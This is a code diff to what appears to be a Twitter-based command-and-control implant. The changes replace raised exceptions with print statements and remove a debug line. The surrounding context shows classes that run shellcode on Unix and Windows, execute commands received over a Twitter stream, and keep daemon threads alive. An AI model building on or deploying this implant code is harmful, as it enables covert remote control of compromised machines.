@@ -139,7 +139,7 @@ class CommandToExecute:
             self.jobid = data['jobid']
         
         except Exception as e:
-            raise DecodingException("Error from decoding the command in commandToExecute class, message: %s"%message, e)
+            print "Error from decoding the command in commandToExecute class, message: %s"%message, e
 
     def is_for_me(self):
         """
@@ -264,7 +264,7 @@ class ExecuteShellcode(threading.Thread):
                 self.unix_exit(current_fd, free_space)
             
             except Exception as e:
-                raise ShellcodeExecException('Error when running shellcode on unix systems', e)
+                print 'Error when running shellcode on unix systems', e
     
         else:                                                                                   # for windows system
             try:
@@ -305,7 +305,7 @@ class ExecuteShellcode(threading.Thread):
                 self.wind_exit(ptr, size)                                                                       # releasing memory
                 
             except Exception as e:
-                raise ShellcodeExecException("Error in executing the shellcode in windows system", e)
+                print "Error in executing the shellcode in windows system", e
     
     # these methods will only be called if payload exit func=None
     #NOTE: metasploit 4.16 exitfunc=none does not work, so below functions never get called, and this script is exited 
@@ -361,7 +361,6 @@ class ExecuteCommand(threading.Thread):
         # set up our thread in the initalization process
         self.daemon = True                          # this will not exit when main thread exits
         self.start()                                # starting thread
-	print "hello im inside ExecuteCommand.__init__"
     
     def run(self):                                  # each thread will do the following
         """
@@ -423,10 +422,10 @@ class StdOutListener(StreamListener):
 			    ExecuteCommand(jobid, cmd)						# execute it with E.C. class
 			
                 except Exception as e :                                                         # err if we cant parse and execute cmd
-                    raise TwittorStreamException("Error in parsing command in stdOutListener", e)
+                    print "Error in parsing command in stdOutListener", e
 
         except Exception as e:
-            raise TwittorStreamException("Error in loading, and decoding message: %s" %raw_data, e)
+            print "Error in loading, and decoding message: %s" %raw_data, e
 
 #        return True                                         # return true to keep the stream alive, aka keep listening, otherwise false to kill
                                                             # this alters self.running property, which is checked throughout the class methods
@@ -458,7 +457,7 @@ def main():
         stream.userstream()                                                 # starting user stream for user functionality listening stream
                                                                             # caution, this is a blocking call
     except Exception as e:
-        raise TwittorException("Error in main()", e)
+        print "Error in main()", e
 
 
 ##################################################################################################################################################
